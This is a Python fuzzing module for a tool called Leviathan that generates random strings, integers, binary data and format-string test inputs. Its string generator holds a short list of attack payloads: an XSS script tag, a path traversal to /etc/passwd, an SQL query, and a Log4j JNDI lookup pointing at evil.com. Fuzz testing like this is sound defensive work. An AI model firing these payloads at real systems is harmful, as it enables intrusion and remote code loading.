"""Basic fuzzing module for Leviathan."""

import random
import string
from typing import List, Dict, Any, Optional, Callable
from pathlib import Path

from ...core.module_base import AnalysisModule
from ...utils.logging import get_logger


class BasicFuzzer(AnalysisModule):
    """Basic fuzzing module for generating test inputs."""

    def __init__(self, config=None):
        super().__init__(config)
        self.logger = get_logger("leviathan.modules.fuzzing.basic")

    @property
    def name(self) -> str:
        return "basic_fuzzer"

    @property
    def description(self) -> str:
        return "Generates basic fuzzing inputs for testing"

    async def analyze(self, target: Any) -> Dict[str, Any]:
        """Generate fuzzing inputs for target."""
        if not isinstance(target, dict):
            raise ValueError("Target must be a configuration dictionary")

        # Get fuzzing configuration
        input_type = target.get("type", "string")
        length_range = target.get("length_range", (1, 100))
        count = target.get("count", 100)
        seed = target.get("seed")

        if seed is not None:
            random.seed(seed)

        self.logger.info(
            "Starting basic fuzzing",
            input_type=input_type,
            length_range=length_range,
            count=count
        )

        # Generate fuzzing inputs
        inputs = self._generate_inputs(input_type, length_range, count)

        return {
            "input_type": input_type,
            "length_range": length_range,
            "count": count,
            "inputs": inputs,
            "total_generated": len(inputs)
        }

    def _generate_inputs(self, input_type: str, length_range: tuple, count: int) -> List[Any]:
        """Generate fuzzing inputs based on type."""
        min_len, max_len = length_range
        inputs = []

        if input_type == "string":
            inputs = self._generate_strings(min_len, max_len, count)
        elif input_type == "integer":
            inputs = self._generate_integers(min_len, max_len, count)
        elif input_type == "binary":
            inputs = self._generate_binary(min_len, max_len, count)
        elif input_type == "format_string":
            inputs = self._generate_format_strings(min_len, max_len, count)
        else:
            # Default to strings
            inputs = self._generate_strings(min_len, max_len, count)

        return inputs

    def _generate_strings(self, min_len: int, max_len: int, count: int) -> List[str]:
        """Generate random strings."""
        inputs = []

        # Character sets
        chars = string.ascii_letters + string.digits + string.punctuation + " \t\n\r"

        for _ in range(count):
            length = random.randint(min_len, max_len)
            # Mix of random and special strings
            if random.random() < 0.1:  # 10% special cases
                special_strings = [
                    "",  # Empty string
                    "A" * length,  # Repeated character
                    "\x00" * length,  # Null bytes
                    "<script>alert('xss')</script>",  # XSS attempt
                    "../../../etc/passwd",  # Path traversal
                    "SELECT * FROM users",  # SQL injection
                    "${jndi:ldap://evil.com}",  # Log4j exploit
                ]
                inputs.append(random.choice(special_strings))
            else:
                inputs.append(''.join(random.choice(chars) for _ in range(length)))

        return inputs

    def _generate_integers(self, min_len: int, max_len: int, count: int) -> List[int]:
        """Generate random integers."""
        inputs = []

        for _ in range(count):
            # Generate integers with various bit patterns
            if random.random() < 0.5:
                # Normal range
                inputs.append(random.randint(0, 2**32))
            else:
                # Edge cases
                edge_cases = [
                    0, -1, 1,
                    2**8, 2**16, 2**32, 2**64,
                    -2**8, -2**16, -2**32, -2**64,
                    0xFFFFFFFF, 0x80000000, 0x40000000
                ]
                inputs.append(random.choice(edge_cases))

        return inputs

    def _generate_binary(self, min_len: int, max_len: int, count: int) -> List[bytes]:
        """Generate random binary data."""
        inputs = []

        for _ in range(count):
            length = random.randint(min_len, max_len)
            data = bytes(random.randint(0, 255) for _ in range(length))
            inputs.append(data)

        return inputs

    def _generate_format_strings(self, min_len: int, max_len: int, count: int) -> List[str]:
        """Generate format string vulnerabilities."""
        inputs = []

        format_specs = ["%s", "%d", "%x", "%p", "%n", "%%", "%*s", "%.*s"]

        for _ in range(count):
            length = random.randint(min_len, max_len)
            # Create format strings with various specifiers
            num_specs = random.randint(1, min(10, length // 2))
            format_str = ""

            for _ in range(num_specs):
                format_str += random.choice(format_specs)

            # Pad to desired length
            while len(format_str) < length:
                format_str += random.choice(string.ascii_letters + string.digits)

            inputs.append(format_str[:length])

        return inputs